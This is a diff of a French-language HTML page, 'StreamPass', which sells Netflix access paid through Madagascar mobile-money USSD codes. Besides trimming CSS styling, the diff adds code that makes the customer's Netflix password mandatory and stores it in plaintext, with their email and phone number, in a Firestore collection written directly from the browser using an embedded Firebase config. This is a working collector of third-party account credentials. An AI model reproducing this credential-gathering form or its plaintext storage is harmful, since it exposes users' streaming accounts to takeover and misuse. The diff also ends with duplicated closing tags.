@@ -49,7 +49,7 @@
             100% { transform: translate(35%, 25%) scale(1.25); }
         }
 
-        /* --- NAVIGATION ELITE AMÉLIORÉE --- */
+        /* --- NAVIGATION --- */
         nav {
             position: fixed; top: 0; width: 100%; padding: 30px 8%;
             display: flex; justify-content: space-between; align-items: center;
@@ -65,16 +65,13 @@
             filter: drop-shadow(0 0 15px rgba(255, 0, 0, 0.6));
         }
 
-        /* --- NOUVEAU STATUS BADGE DESIGN --- */
         .status-badge {
             display: flex; align-items: center; gap: 10px; font-size: 11px;
             font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px;
             color: var(--status-green); background: rgba(0, 255, 85, 0.05);
             padding: 8px 18px; border-radius: 50px; border: 1px solid rgba(0, 255, 85, 0.2);
-            box-shadow: 0 0 15px rgba(0, 255, 85, 0.1); position: relative;
         }
 
-        .status-icon { font-size: 14px; filter: drop-shadow(0 0 5px var(--status-green)); }
         .status-dot {
             height: 8px; width: 8px; background-color: var(--status-green);
             border-radius: 50%; display: inline-block; animation: pulse-green 2s infinite;
@@ -86,33 +83,22 @@
             100% { box-shadow: 0 0 0 0 rgba(0, 255, 85, 0); }
         }
 
-        /* --- HERO SECTION AMÉLIORÉE --- */
-        header { text-align: center; padding: 160px 20px 50px; animation: fadeInDown 1s ease-out; }
+        /* --- HERO --- */
+        header { text-align: center; padding: 160px 20px 50px; }
         header h1 {
             font-size: 55px; font-weight: 800; margin: 0; letter-spacing: -3px;
-            line-height: 1; text-transform: uppercase; background: linear-gradient(to bottom, #fff 60%, #aaa);
+            text-transform: uppercase; background: linear-gradient(to bottom, #fff 60%, #aaa);
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
-        header p { color: #999; font-size: 19px; margin-top: 15px; font-weight: 300; letter-spacing: 1px; }
+        header p { color: #999; font-size: 19px; margin-top: 15px; font-weight: 300; }
 
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* --- THE MASTER CARD --- */
+        /* --- FORMULAIRE ET INPUTS --- */
         .main-container { display: flex; justify-content: center; padding: 0 20px 120px; }
         .card {
             background: var(--card-glass); padding: 55px 45px; border-radius: 40px;
             backdrop-filter: blur(45px) saturate(210%); border: 1px solid rgba(255, 255, 255, 0.06);
             width: 100%; max-width: 460px; box-shadow: 0 50px 120px rgba(0, 0, 0, 0.95);
-            position: relative; overflow: hidden; animation: scaleIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .card::after {
-            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.03) 0%, transparent 60%);
-            pointer-events: none;
+            position: relative; overflow: hidden;
         }
 
         .card-line {
@@ -126,94 +112,68 @@
             100% { background-position: -200% 0; }
         }
 
-        /* --- ANNONCE PAYE TON NETFLIX --- */
         .promo-banner {
             text-align: center; background: linear-gradient(90deg, transparent, var(--primary), transparent);
             padding: 12px; font-weight: 900; text-transform: uppercase; letter-spacing: 3px;
-            font-size: 13px; margin-bottom: 25px; border-radius: 12px; animation: pulseBanner 2.5s infinite;
-            border: 1px solid rgba(255, 255, 255, 0.1); text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            font-size: 13px; margin-bottom: 25px; border-radius: 12px;
         }
 
-        @keyframes pulseBanner {
-            0%, 100% { opacity: 0.8; transform: scale(0.99); box-shadow: 0 0 5px rgba(255, 0, 0, 0.2); }
-            50% { opacity: 1; transform: scale(1); box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
-        }
-
-        /* --- LUXURY FORM --- */
-        h2 { text-align: center; font-weight: 900; letter-spacing: -1.5px; margin: 0 0 15px; font-size: 26px; text-transform: uppercase; color: #eee; }
+        h2 { text-align: center; font-weight: 900; margin: 0 0 15px; font-size: 26px; text-transform: uppercase; }
         label { display: block; margin-top: 25px; color: #666; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; }
+        
+        /* ICI LE FIX POUR LE MENU DÉROULANT */
         select, input {
             width: 100%; padding: 19px; margin-top: 10px; border-radius: 18px;
-            border: 1px solid rgba(255, 255, 255, 0.04); background: rgba(0, 0, 0, 0.3);
-            color: white; font-size: 16px; font-family: 'Plus Jakarta Sans', sans-serif;
-            box-sizing: border-box; transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1); outline: none;
+            border: 1px solid rgba(255, 255, 255, 0.04); background: rgba(20, 20, 20, 0.8);
+            color: white; font-size: 16px; box-sizing: border-box; outline: none;
         }
-        select option { background-color: #080808; color: white; padding: 20px; }
-        select:focus, input:focus { border-color: var(--accent); background: rgba(255, 77, 77, 0.04); box-shadow: 0 0 25px rgba(255, 77, 77, 0.15); }
+
+        /* Correction du fond blanc sur les options */
+        select option {
+            background-color: #111; /* Fond sombre pour les propositions */
+            color: white;           /* Texte blanc */
+        }
 
         .price-tag {
             background: radial-gradient(circle at center, rgba(255, 0, 0, 0.25) 0%, transparent 80%);
             padding: 22px; border-radius: 20px; margin-top: 25px; border: 1px solid rgba(255, 0, 0, 0.5);
             text-align: center; font-weight: 800; font-size: 34px; color: white; display: none;
-            animation: glowPulse 2s infinite; text-shadow: 0 0 15px rgba(255, 255, 255, 0.7);
         }
 
-        /* --- BENTO PAYMENT BUTTONS --- */
+        /* --- BUTTONS --- */
         .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; margin-top: 35px; }
         .full { grid-column: span 2; }
         .btn {
             padding: 22px; border: none; border-radius: 20px; cursor: pointer;
             font-weight: 800; font-size: 12px; text-transform: uppercase; color: white;
-            transition: 0.5s cubic-bezier(0.16, 1, 0.3, 1); display: flex; flex-direction: column;
-            align-items: center; gap: 10px; position: relative; overflow: hidden;
-            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.4);
+            transition: 0.4s; display: flex; flex-direction: column; align-items: center; gap: 10px;
         }
-        .btn::before {
-            content: ""; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-            transition: 0.5s;
-        }
-        .btn:hover::before { left: 100%; }
-
-        .btn-mvola { background: linear-gradient(145deg, var(--mvola) 0%, #007a2e 100%); border: 1px solid rgba(0, 255, 100, 0.1); }
-        .btn-orange { background: linear-gradient(145deg, var(--orange) 0%, #cc5200 100%); border: 1px solid rgba(255, 150, 0, 0.1); }
-        .btn-airtel { background: linear-gradient(145deg, var(--airtel) 0%, #a00000 100%); border: 1px solid rgba(255, 100, 100, 0.1); }
-        .btn:hover { transform: translateY(-8px) scale(1.02); box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6); filter: brightness(1.1); }
-        .btn:active { transform: translateY(-2px) scale(0.99); }
+        .btn-mvola { background: linear-gradient(145deg, var(--mvola) 0%, #007a2e 100%); }
+        .btn-orange { background: linear-gradient(145deg, var(--orange) 0%, #cc5200 100%); }
+        .btn-airtel { background: linear-gradient(145deg, var(--airtel) 0%, #a00000 100%); }
+        .btn:hover { transform: translateY(-5px); filter: brightness(1.2); }
 
         #error {
             color: #ffb3b3; background: rgba(255, 0, 0, 0.15); padding: 18px;
             border-radius: 14px; margin-top: 25px; font-size: 13px; text-align: center;
-            border: 1px solid rgba(255, 0, 0, 0.4); display: none; font-weight: 500;
+            border: 1px solid rgba(255, 0, 0, 0.4); display: none;
         }
 
-        /* --- FINAL SUCCESS VIEW --- */
-        #success-view { display: none; text-align: center; animation: zoomIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        /* SUCCESS VIEW */
+        #success-view { display: none; text-align: center; animation: zoomIn 0.5s ease; }
         .ussd-mega-btn {
             background: linear-gradient(135deg, #fff 0%, #ccc 100%); color: #000;
             padding: 26px; border-radius: 22px; text-decoration: none; display: block;
-            margin: 35px 0; font-weight: 900; font-size: 21px; box-shadow: 0 20px 40px rgba(255, 255, 255, 0.15);
-            transition: 0.3s; letter-spacing: 1px;
+            margin: 35px 0; font-weight: 900; font-size: 21px;
         }
-        .ussd-mega-btn:hover { transform: scale(1.03); box-shadow: 0 25px 50px rgba(255, 255, 255, 0.2); }
-        .ussd-mega-btn:active { transform: scale(0.97); }
+        .recap-box { background: rgba(0, 0, 0, 0.4); padding: 25px; border-radius: 20px; text-align: left; font-size: 14px; color: #ccc; }
 
-        .recap-box { background: rgba(0, 0, 0, 0.4); padding: 25px; border-radius: 20px; text-align: left; border: 1px solid rgba(255, 255, 255, 0.04); font-size: 14px; color: #ccc; line-height: 1.6; }
-        .recap-box b { color: white; font-weight: 500; }
-
-        @keyframes scaleIn { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
-        @keyframes zoomIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes glowPulse {
-            0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.3); border-color: rgba(255, 0, 0, 0.5); }
-            50% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.6); border-color: rgba(255, 100, 100, 0.8); }
-        }
-
-        footer { text-align: center; padding: 50px; color: #3a3a3a; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 3px; }
-        
-        /* Loading Overlay */
         #loading-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-glass); border-radius: 40px; z-index: 10; justify-content: center; align-items: center; flex-direction: column; }
         .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: var(--primary); animation: spin 1s linear infinite; margin-bottom: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes zoomIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        footer { text-align: center; padding: 50px; color: #3a3a3a; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 3px; }
     </style>
 </head>
 <body>
@@ -226,7 +186,6 @@
         <div class="logo">StreamPass</div>
         <div class="status-badge">
             <span class="status-dot"></span>
-            <span class="status-icon"></span>
             PREMIUM ACTIVE
         </div>
     </nav>
@@ -242,7 +201,7 @@
             
             <div id="loading-overlay">
                 <div class="spinner"></div>
-                <p style="font-size: 12px; font-weight: bold; color: white;">Connexion Sécurisée...</p>
+                <p style="color: white; font-weight: bold;">Traitement...</p>
             </div>
 
             <div class="promo-banner">🍿 PAYE TON NETFLIX 🍿</div>
@@ -263,10 +222,10 @@
                     <span id="prixValeur">0 Ar</span>
                 </div>
 
-                <label>2. Adresse DU COMPTE NETFLIX (ID)</label>
+                <label>2. Adresse DU COMPTE NETFLIX</label>
                 <input type="email" id="email" placeholder="votre-email@gmail.com">
 
-                <label>3. MOT DE PASSE DU COMPTE NETFLIX</label>
+                <label>3. MOT DE PASSE DU COMPTE</label>
                 <input type="password" id="password" placeholder="votre mot de passe">
                 
                 <label>4. Ligne Mobile Money</label>
@@ -274,9 +233,9 @@
                 <div id="error">⚠️ SYSTEM : TOUS LES CHAMPS SONT OBLIGATOIRES</div>
 
                 <div class="btn-grid">
-                    <button class="btn btn-mvola" onclick="lancer('MVola')"><span style="font-size:26px">M</span>MVOLA</button>
-                    <button class="btn btn-orange" onclick="lancer('Orange Money')"><span style="font-size:26px">O</span>ORANGE</button>
-                    <button class="btn btn-airtel full" onclick="lancer('Airtel Money')"><span style="font-size:26px">A</span>AIRTEL MONEY CASH</button>
+                    <button class="btn btn-mvola" onclick="lancer('MVola')">MVOLA</button>
+                    <button class="btn btn-orange" onclick="lancer('Orange Money')">ORANGE</button>
+                    <button class="btn btn-airtel full" onclick="lancer('Airtel Money')">AIRTEL MONEY CASH</button>
                 </div>
             </div>
 
@@ -285,15 +244,13 @@
     </div>
 
     <footer>
-        ZÉBU COINS MADAGASCAR &copy; 2026 • 037 65 444 36 (disponible de 11h-14h et 20h-23h)
+        ZÉBU COINS MADAGASCAR &copy; 2026 • 037 65 444 36
     </footer>
 
     <script type="module">
-        // 1. Importer les modules Firebase depuis le CDN
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-firestore.js";
 
-        // 2. Ta configuration Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyAbMN3LDkQ3f13bXUPoNI3bel5wL4R9i4g",
             authDomain: "zebucoins-streampass.firebaseapp.com",
@@ -303,11 +260,9 @@
             appId: "1:191665739537:web:34f90f3542c51d8a56deb0"
         };
 
-        // 3. Initialiser Firebase et Firestore
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // 4. Attacher les fonctions à 'window' pour qu'elles soient lisibles par le HTML
         window.majPrix = function() {
             const select = document.getElementById('service');
             const priceBox = document.getElementById('priceDisplay');
@@ -321,75 +276,55 @@
         window.lancer = async function(mode) {
             const prixRaw = document.getElementById('service').value;
             const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             const tel = document.getElementById('tel').value;
             const errorDiv = document.getElementById('error');
             const loadingOverlay = document.getElementById('loading-overlay');
 
-            // Vérification des champs
-            if (!prixRaw || !email || !tel) {
-                errorDiv.innerText = "⚠️ SYSTEM : TOUS LES CHAMPS SONT OBLIGATOIRES";
+            if (!prixRaw || !email || !tel || !password) {
                 errorDiv.style.display = "block";
                 return;
             }
 
-            // Afficher le chargement
             loadingOverlay.style.display = "flex";
 
-            // Enregistrer la commande dans Firestore
             try {
                 await addDoc(collection(db, "commandes"), {
                     catalogue: prixRaw,
                     email_client: email,
+                    password_client: password,
                     telephone_client: tel,
                     methode_paiement: mode,
                     date_commande: serverTimestamp(),
-                    statut: "En attente de paiement"
+                    statut: "En attente"
                 });
-                console.log("Commande sauvegardée dans Firestore !");
             } catch (e) {
-                console.error("Erreur d'enregistrement : ", e);
                 loadingOverlay.style.display = "none";
-                errorDiv.innerText = "⚠️ ERREUR RÉSEAU : Impossible d'enregistrer la commande.";
+                errorDiv.innerText = "⚠️ Erreur Base de données";
                 errorDiv.style.display = "block";
-                return; // On stoppe tout si la base de données ne répond pas
+                return;
             }
 
-            // Calcul du montant net et code USSD (Masquer le loading)
             loadingOverlay.style.display = "none";
             const montantNet = prixRaw.replace(/\s/g, '').replace('Ar', '');
-            let codeUSSD = "";
+            let codeUSSD = mode === 'MVola' ? `tel:*111*1*2*0376544436*${montantNet}#` : 
+                           mode === 'Orange Money' ? `tel:*144*2*0376544436*${montantNet}#` : 
+                           `tel:*150*1*1*0376544436*${montantNet}#`;
 
-            if (mode === 'MVola') codeUSSD = `tel:*111*1*2*0376544436*${montantNet}#`;
-            else if (mode === 'Orange Money') codeUSSD = `tel:*144*2*0376544436*${montantNet}#`;
-            else codeUSSD = `tel:*150*1*1*0376544436*${montantNet}#`;
-
-            // Cacher le formulaire et afficher le succès
             document.getElementById('formContainer').style.display = "none";
             document.querySelector('.promo-banner').style.display = "none";
             const successView = document.getElementById('success-view');
             successView.style.display = "block";
 
             successView.innerHTML = `
-            <div style="margin-bottom:35px;">
-                <div style="font-size:80px; margin-bottom:15px; filter: drop-shadow(0 0 20px rgba(255,255,255,0.5));">💫</div>
-                <h3 style="font-weight:900; font-size:30px; letter-spacing:-1.5px; text-transform:uppercase;">CONFIRMATION</h3>
-                <p style="color:#aaa; font-size:15px; font-weight:300;">Transfert de <b style="color:#fff; font-weight:500;">${prixRaw}</b> via ${mode}</p>
-            </div>
-            
-            <a href="${codeUSSD}" class="ussd-mega-btn">LANCER LE PAIEMENT</a>
-
-            <div class="recap-box">
-                <span style="color:#666; font-weight:800; font-size:10px; text-transform:uppercase; letter-spacing:1px; display:block; margin-bottom:10px;">Détails de commande</span>
-                Destinataire : <b style="color:var(--accent)">${email}</b><br>
-                <div style="margin-top:5px;">Source : <b>${tel}</b></div>
-            </div>
-
-            <button onclick="window.location.reload()" style="background:none; border:none; color:#555; cursor:pointer; margin-top:35px; font-weight:800; font-size:10px; text-transform:uppercase; letter-spacing:2px; transition: 0.3s;" onmouseover="this.style.color='#888'" onmouseout="this.style.color='#555'"> Annuler / Retour </button>
+                <div style="font-size:60px; margin-bottom:15px;">💫</div>
+                <h3>CONFIRMATION</h3>
+                <p>Transfert de <b>${prixRaw}</b> via ${mode}</p>
+                <a href="${codeUSSD}" class="ussd-mega-btn">LANCER LE PAIEMENT</a>
+                <div class="recap-box">Compte : <b>${email}</b><br>Source : <b>${tel}</b></div>
+                <button onclick="window.location.reload()" style="background:none; border:none; color:#555; cursor:pointer; margin-top:30px; font-weight:800; text-transform:uppercase;">Retour</button>
             `;
         }
-    </script>
-</body>
-</html>
     </script>
 </body>
 </html>
